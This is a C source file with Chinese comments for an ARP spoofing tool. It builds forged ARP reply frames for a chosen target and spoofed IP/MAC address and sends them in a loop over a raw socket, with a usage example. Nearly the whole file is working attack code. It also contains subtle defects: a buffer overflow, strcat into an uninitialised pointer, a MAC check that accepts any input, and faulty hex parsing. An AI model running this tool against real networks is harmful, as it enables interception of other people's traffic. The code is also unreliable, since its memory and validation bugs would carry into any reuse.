/**
 * 引入库文件
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <errno.h>
#include <arpa/inet.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>

/**
 * 定义改变printf()输出的颜色
 */
#define COLOR_DEFAULT_IN_PRINTF "\033[m"
#define COLOR_RED_IN_PRINTF     "\033[0;32;31m"
#define COLOR_GREEN_IN_PRINTF   "\033[0;32;32m"

/**
 * 定义具有颜色标记的printf()
 */
#define perror(message) {   \
  printf(COLOR_RED_IN_PRINTF " ! Error: " COLOR_DEFAULT_IN_PRINTF message);   \
  exit(EXIT_FAILURE);   \
}
#define perror_args(message, args) {   \
  printf(COLOR_RED_IN_PRINTF " ! Error: " COLOR_DEFAULT_IN_PRINTF message, args);   \
  exit(EXIT_FAILURE);   \
}
#define pinfo(message) {    \
  printf(COLOR_GREEN_IN_PRINTF "--------->>-Information-<<----------\n"    \
  COLOR_DEFAULT_IN_PRINTF message   \
  COLOR_GREEN_IN_PRINTF "\n--------->>-----END-----<<----------\n");    \
}

/**
 * ARP报文结构
 */
struct arpstu
{
  unsigned short int ar_hrd;   /* Format of hardware address.  */
  unsigned short int ar_pro;   /* Format of protocol address.  */
  unsigned char ar_hln;   /* Length of hardware address.  */
  unsigned char ar_pln;   /* Length of protocol address.  */
  unsigned short int ar_op;   /* ARP opcode (command).  */
  unsigned char ar_sha[6];    /* Sender hardware address.  */
  unsigned char ar_sip[4];    /* Sender IP address.  */
  unsigned char ar_tha[6];    /* Target hardware address.  */
  unsigned char ar_tip[4];    /* Target IP address.  */
};

/**
 * mac_format_check
 * 检验mac地址合法性
 */
static int mac_format_check(const char * mac);

/**
 * mac_hex_to_decimal
 * 将十六进制mac地址中的一项转为十进制mac地址中的一项
 */
static int mac_hex_to_decimal(const char * hex_mac);

/**
 * copy_ip
 * 将参数ip做合法性检测,并复制至目标ip中
 */
static int copy_ip(const char *args_ip , char *dest_ip);

/**
 * copy_mac
 * 将参数mac做合法性检测,并复制至目标mac中
 */
static int copy_mac(const char *args_mac , char *dest_mac);

/**
 * get_local_mac
 * 获取本机iface的mac地址
 */
static int get_local_mac(unsigned char * iface , unsigned char *local_mac );

/**
 * ARP Spoof
 * 运行参数可参考 -h 获取相关信息
 */
int main(int argc, char* argv[])
{
  /*
   * 获取相关参数
   */
  unsigned int  spoof_count = 10; // 攻击总次数
  unsigned char net_interface[16]  = "eth0";
  unsigned char target_ip[4]  = {0}; // Target IP
  unsigned char spoofing_ip[4]  = {0}; // Spoofing IP
  unsigned char target_mac[6] = {0}; // TargetMAC
  unsigned char spoofing_mac[6] = {0}; // spoofing MAC
  unsigned char local_mac[6] = {0}; // localhost MAC;
  unsigned char ethernet_frame[64] = {0}; // ethernet frame

  int opt;
  while ((opt = getopt(argc, argv, "i:t:T:s:S:hc:")) != -1) {
    switch (opt) {
    case 'i': {
      char filename[16] = "" ;
      if (strlen(optarg) > 16) {
        perror("-i interface名称过长\n");
      }
      strcat(filename, "/sys/class/net/");
      strcat(filename, optarg);
      strcat(filename, "/address");
      if (access(filename, 0) == 0) {
        memcpy(net_interface , optarg , sizeof(char)* strlen(optarg));
      } else {
        perror_args("-i interface未知 : %s\n", optarg);
      }
    } break;

    case 'c': { // 攻击总次数
      if ((spoof_count = atoi(optarg)) <= 0) {
        perror("-c 攻击总次数格式错误\n");
      }
    } break ;

    case 't': { // target IP
      if (copy_ip(optarg , (char*)&target_ip[0] ) == 0) {
        perror("-t 目标IP格式错误\n");
      }
    } break ;

    case 'T': { // target mac
      if (copy_mac(optarg , (char*)&target_mac[0] ) == 0) {
        perror("-T 目标MAC格式错误\n");
      }
    } break ;

    case 's': { // spoofing IP
      if (copy_ip(optarg , (char*)&spoofing_ip[0] ) == 0) {
        perror("-s 源IP或伪装IP格式错误\n");
      }
    } break ;

    case 'S': { // spoofing mac
      if (copy_mac(optarg , (char*)&spoofing_mac[0] ) == 0) {
        perror("-S 源MAC或伪装MAC格式错误\n");
      }
    } break ;

    case 'h':
    default : {
      pinfo("使用说明:\n    \
-t,   目标ip, 必须参数\n    \
-T,   目标mac, 必须参数\n    \
-s,   源IP或伪装IP, 必须参数\n    \
-S,   源MAC或伪装MAC, 必须参数\n    \
-i,   网卡名称, 可选参数, 默认eth0\n    \
-c,   攻击次数, 可选参数, 默认10\n    \
-h,   帮助信息\n\n    \
例如: arpspoof -t 192.168.1.140 -T AA:BB:CC:DD:EE:00 -s 192.168.1.254 -S AA:BB:CC:DD:EE:01 \n    \
更多详情请参阅: http://www.github.com/sunxiaoyang\n");
    }  exit(1) ;
    }
  }

  /*
   * 获取本机mac地址
   */
  if (get_local_mac(net_interface , local_mac) == 0) {
    perror("本机mac获取失败");
  }

  /*
   * 生成arp报文
   */
  arpstu arp ;
  arp.ar_hrd = htons (ARPHRD_ETHER);
  arp.ar_pro = htons (2048);
  arp.ar_hln = 6;
  arp.ar_pln = 4 ;
  arp.ar_op = htons(ARPOP_REPLY);
  memcpy(arp.ar_sha , spoofing_mac  , sizeof(char) * arp.ar_hln);
  memcpy(arp.ar_sip , spoofing_ip , sizeof(char) * arp.ar_pln);
  memcpy(arp.ar_tha , target_mac, sizeof(char) * arp.ar_hln);
  memcpy(arp.ar_tip , target_ip , sizeof(char) * arp.ar_pln);

  /*
   * 将arp报文封装成以太网报文
   */
  memcpy(ethernet_frame , target_mac , sizeof(char) * 6);
  memcpy(ethernet_frame + 6 , local_mac , sizeof(char) * 6);
  ethernet_frame[12] = ETH_P_ARP / 256;
  ethernet_frame[13] = ETH_P_ARP % 256;
  memcpy (ethernet_frame + 14, &arp, sizeof (char) * 28);

  /*
   * 创建raw socket链接
   */
  int raw_socket ;
  if ( (raw_socket = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL) )) < 0) {
    perror("创建raw socket失败. \n")
  }

  // 获取网卡的ibdex
  struct sockaddr_ll device;
  if ((device.sll_ifindex = if_nametoindex ((const char*)net_interface)) == 0) {
    perror("if_nametoindex() 获取网卡index失败 ")
  }
  device.sll_family = AF_PACKET;
  device.sll_halen = htons (6);

  /*
   * arp 连续攻击
   */
  struct timespec ts;
  ts.tv_sec = 0;
  ts.tv_nsec = 100000000;

  // 发送报文至NIC
  printf("------------>-arp攻击开始-<------------\n");
  while (spoof_count--) {
    if (sendto (raw_socket, ethernet_frame, 42, 0, (struct sockaddr *) &device, sizeof (device)) <= 0) {
      perror ("发送失败\n");
    }
    printf("+");
    if (spoof_count % 50 == 0)printf("\n");
    nanosleep(&ts, NULL);
  }

  // 关闭raw socket
  close(raw_socket);
  printf("\n------------>-arp攻击结束-<------------\n");

  return 0;
}

/**
 * mac_format_check
 * 检验mac地址合法性
 * @param  mac mac地址
 * @return     1:成功,0:失败
 */
static int mac_format_check(const char * mac)
{
  if (strlen(mac) != 17) {
    return 0 ;
  } else {
    for (int i = 0 ; i < 6 ; i++) {
      char num1 = *(mac + i * 3) ;
      char num2 = *(mac + i * 3 + 1) ;
      char dot  = *(mac + i * 3 + 2) ;
      if (i < 5 && dot != ':') //last set no :
        return 0 ;
      if (!((num1 >= 'a' || num1 <= 'e') ||
            (num1 >= 'A' || num1 <= 'E') ||
            (num1 >= '0' || num1 <= '9')) ||
          !((num2 >= 'a' || num2 <= 'e') ||
            (num2 >= 'A' || num2 <= 'E') ||
            (num2 >= '0' || num2 <= '9')))
        return 0 ;
    }
  }
  return 1;
}

/**
 * mac_hex_to_decimal
 * 将十六进制mac地址中的一项转为十进制mac地址中的一项
 * @param  hex_mac 十六进制mac地址
 * @return         十进制mac地址
 */
static int mac_hex_to_decimal(const char * hex_mac)
{
  char num1 = *(hex_mac) ;
  char num2 = *(hex_mac + 1) ;
  int dec_mac = 0;

  if (num1 <= '9') dec_mac += (num1 - '0') * 16 ;
  else if (num1 <= 'e') dec_mac += (num1 - 'a' + 10) * 16 ;
  else if (num1 <= 'E') dec_mac += (num1 - 'A' + 10) * 16 ;

  if (num2 <= '9') dec_mac += (num2 - '0') ;
  else if (num2 <= 'e') dec_mac += (num2 - 'a' + 10) ;
  else if (num2 <= 'E') dec_mac += (num2 - 'A' + 10) ;

  return dec_mac ;
}

/**
 * copy_ip
 * 将参数ip做合法性检测,并复制至目标ip中
 * @param  args_ip 参数ip
 * @param  dest_ip 目标ip
 * @return         1:成功,0:失败
 */
static int copy_ip(const char *args_ip , char *dest_ip)
{
  /*
   * inet_addr
   * 作用: 将点分十进制的ip转换成一个长整数
   * 结果: 正确则返回无符号长整数,失败则返回INADDR_NONE
   */
  in_addr_t ip_s = inet_addr(args_ip);
  if (ip_s == INADDR_NONE) {
    memset(dest_ip , 0 , sizeof(char) * 15);
    return 0;
  }

  memcpy(dest_ip , &ip_s , sizeof(int));
  return 1;
}

/**
 * copy_mac
 * 将参数mac做合法性检测,并复制至目标mac中
 * @param  args_mac 参数mac
 * @param  dest_mac 目标mac
 * @return          1:成功,0:失败
 */
static int copy_mac(const char *args_mac , char *dest_mac)
{
  if (mac_format_check(args_mac) == 0) {
    memset(dest_mac , 0 , sizeof(char) * 17);
    return 0;
  }
  for (int i = 0 ; i < 6 ; i++) {
    dest_mac[i] = mac_hex_to_decimal(&args_mac[i * 3]) ;
  }
  return 1;
}

/**
 * get_local_mac
 * 获取本机iface的mac地址
 * @param  iface     本机网卡名称
 * @param  local_mac 网卡iface的mac
 * @return           1:成功,0:失败
 */
static int get_local_mac(unsigned char * iface , unsigned char *local_mac )
{
  char buffer[18] = "";
  char * filename;
  strcat(filename, "/sys/class/net/");
  strcat(filename , (char*)iface);
  strcat(filename , "/address");

  FILE *if_f = fopen(filename , "r");
  if (if_f == NULL) {
    return 0 ;
  } else {
    fread(buffer , 1 , 17 , if_f); // 从"/sys/class/net/iface/address"获取iface的mac地址
    fclose(if_f) ;
    for (int i = 0 ; i < 6 ; i++) {
      *(local_mac + i) = mac_hex_to_decimal(&buffer[i * 3]) ;
    }
  }
  return 1;
}